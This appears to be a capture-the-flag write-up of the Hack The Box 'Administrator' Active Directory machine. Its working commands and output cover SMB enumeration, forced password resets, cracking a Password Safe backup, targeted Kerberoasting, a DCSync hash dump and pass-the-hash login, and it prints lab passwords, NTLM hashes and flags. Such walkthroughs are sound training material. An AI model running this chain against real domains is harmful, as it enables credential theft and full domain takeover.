---
title: "HTB Machine : Administrator"
description: Administrator is a medium Windows AD box where SMB enumeration and misconfigured user privileges lead to password resets, credential cracking,finally a DCSync attack to gain full domain admin access.
image: /images/administrator/administrator.png
date: 2025-05-05 20:00:00 +/-TTTT
categories: [HTB]
tags: [DCSync, pentest,Active Directory, Windows ]     # TAG names should always be lowercase
---

## Reconnaissance and Enumeration
### Nmap enumeration

```sh
$ nmap -sV -sC 10.10.11.42
# Nmap 7.94SVN scan initiated Tue Apr  1 00:18:05 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -oA administrator 10.10.11.42
Nmap scan report for 10.10.11.42
Host is up (0.030s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-01 05:18:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-01T05:18:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  1 00:18:34 2025 -- 1 IP address (1 host up) scanned in 28.71 seconds

```
> we add the dns to `/etc/hosts` file
```sh
$ echo '10.10.11.42 dc.administrator.htb administrator.htb' | sudo tee -a /etc/hosts
```
### shares 
```sh
$ nxc smb administrator.htb -u 'Olivia'  -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share 
```
### rid brute : 
```sh 
$ nxc smb administrator.htb -u 'Olivia'  -p 'ichliebedich' --rid-brute
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               498: ADMINISTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                 
SMB         10.10.11.42     445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB         10.10.11.42     445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)
SMB         10.10.11.42     445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB         10.10.11.42     445    DC               512: ADMINISTRATOR\Domain Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               513: ADMINISTRATOR\Domain Users (SidTypeGroup)
SMB         10.10.11.42     445    DC               514: ADMINISTRATOR\Domain Guests (SidTypeGroup)
SMB         10.10.11.42     445    DC               515: ADMINISTRATOR\Domain Computers (SidTypeGroup)
SMB         10.10.11.42     445    DC               516: ADMINISTRATOR\Domain Controllers (SidTypeGroup)                                                                                                      
SMB         10.10.11.42     445    DC               517: ADMINISTRATOR\Cert Publishers (SidTypeAlias)
SMB         10.10.11.42     445    DC               518: ADMINISTRATOR\Schema Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               519: ADMINISTRATOR\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               520: ADMINISTRATOR\Group Policy Creator Owners (SidTypeGroup)                                                                                             
SMB         10.10.11.42     445    DC               521: ADMINISTRATOR\Read-only Domain Controllers (SidTypeGroup)                                                                                            
SMB         10.10.11.42     445    DC               522: ADMINISTRATOR\Cloneable Domain Controllers (SidTypeGroup)                                                                                            
SMB         10.10.11.42     445    DC               525: ADMINISTRATOR\Protected Users (SidTypeGroup)
SMB         10.10.11.42     445    DC               526: ADMINISTRATOR\Key Admins (SidTypeGroup)
SMB         10.10.11.42     445    DC               527: ADMINISTRATOR\Enterprise Key Admins (SidTypeGroup)                                                                                                   
SMB         10.10.11.42     445    DC               553: ADMINISTRATOR\RAS and IAS Servers (SidTypeAlias)                                                                                                     
SMB         10.10.11.42     445    DC               571: ADMINISTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                 
SMB         10.10.11.42     445    DC               572: ADMINISTRATOR\Denied RODC Password Replication Group (SidTypeAlias)                                                                                  
SMB         10.10.11.42     445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB         10.10.11.42     445    DC               1101: ADMINISTRATOR\DnsAdmins (SidTypeAlias)
SMB         10.10.11.42     445    DC               1102: ADMINISTRATOR\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.42     445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB         10.10.11.42     445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB         10.10.11.42     445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB         10.10.11.42     445    DC               1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
SMB         10.10.11.42     445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB         10.10.11.42     445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB         10.10.11.42     445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB         10.10.11.42     445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)
```
### Kerberoasting/ ker AS_REP Roasting
```sh 
$ nxc ldap administrator.htb  -u 'Olivia'  -p 'ichliebedich'   --kerberoasting kerberos.hash

SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.10.11.42     389    DC               Bypassing disabled account krbtgt 
LDAP        10.10.11.42     389    DC               No entries found!
LDAP        10.10.11.42     389    DC               [-] Error with the LDAP account used

$ nxc ldap  administrator.htb  -u 'Olivia'  -p 'ichliebedich'   --asreproast asrep.hash

SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.10.11.42     389    DC               [*] Total of records returned 3
LDAP        10.10.11.42     389    DC               No entries found!
```
                                                                    
### BloodHound :
```sh
$ bloodhound-python -u 'Olivia'  -p 'ichliebedich'  -d administrator.htb -ns 10.10.11.42 -c ALL --zip 
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 09S
INFO: Compressing output into 20250401003446_bloodhound.zip
```

### Analyse and Exploit :

#### Generic All

The user OLIVIA@ADMINISTRATOR.HTB has GenericAll privileges to the user MICHAEL@ADMINISTRATOR.HTB.
This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

![olivier_michel](/images/administrator/olivia_michel.png)

```sh
$ net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebedich" -S "administrator.htb"
```
#### Change Passwd
2 - The user MICHAEL@ADMINISTRATOR.HTB has the capability to change the user BENJAMIN@ADMINISTRATOR.HTB's password without knowing that user's current password.
![michel-benjamin](/images/administrator/michel-benjamin.png)

```sh
$ net rpc password "benjamin" "password" -U "administrator.htb"/"michael"%"password" -S "administrator.htb"
```      


#### FTP Connection

We connected to the FTP server using the credentials for user `benjamin` on the domain `administrator.htb`.

```bash
ftp benjamin@administrator.htb
````

We listed the files available in the FTP directory:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||50856|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
```

* There was one file named `Backup.psafe3` with a size of 952 bytes.
* We proceeded to download the file using:

```bash
ftp> get Backup.psafe3
```

* The file was transferred successfully.

---

### 4 - Cracking the Backup File

The downloaded `Backup.psafe3` file is a password safe backup. We used `hashcat` to crack the encrypted passwords inside it.

```bash
hashcat -m 5200 Backup.psafe3 rockyou.txt
```

* The hash mode `5200` corresponds to Password Safe v3.
* We used the popular `rockyou.txt` wordlist for cracking.

The cracking session was successful and yielded the following credentials:

```
Backup.psafe3:tekieromucho
Session..........: hashcat
Status...........: Cracked
```
```sh
$ pwsafe Backup.psafe3 
 
username::passwd
alexander::UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily::UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma::WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

> We obtained plaintext passwords for multiple users, including `emily`.

---

### Retrieving the user.txt Flag

Using the cracked password for user `emily`, we accessed the target system via Evil-WinRM, a remote PowerShell shell:

```bash
evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

> After connecting, we navigated to `emily`'s Documents folder.
> We located and displayed the contents of the user flag file:

```sh
cat ../desktop/user.txt
fb61f6a4caada6fb8ec90ba2c2618514
```

* The flag was successfully retrieved, confirming initial user access.

----
# Privilege Escalation 

> Note: BloodHound was used to identify the relationships and permissions that enabled the following privilege escalation chain.

#### Step 1: Identifying GenericWrite Access

User `EMILY@ADMINISTRATOR.HTB` has **GenericWrite** permissions over `ETHAN@ADMINISTRATOR.HTB`.  
This allows modification of non-protected attributes such as `servicePrincipalName`, which is exploitable via Kerberoasting.

---

#### Step 2: Targeted Kerberoasting

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

A Kerberos ticket hash for user `ethan` was obtained and cracked using Hashcat:

```bash
hashcat hash.txt rockyou.txt
```

Result:

```
ethan::limpbizkit
```


#### Step 3: Verifying DCSync Rights

BloodHound also confirmed that `ETHAN@ADMINISTRATOR.HTB` has the following domain-level privileges:

* DS-Replication-Get-Changes
* DS-Replication-Get-Changes-All

These privileges allow execution of a DCSync attack using Impacket.

---

## Step 4: Performing DCSync Attack

```bash
impacket-secretsdump 'administrator.htb/ethan:limpbizkit@administrator.htb'
```

Output:

```yaml
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
```

---

## Step 5: Gaining Administrative Access

Using the NTLM hash of the Administrator account with Evil-WinRM:

```bash
evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Inside the remote shell:

```shell
cd ..
cd Administrator
cat Desktop/root.txt
3983107348cc99cd929b487034b20896
```

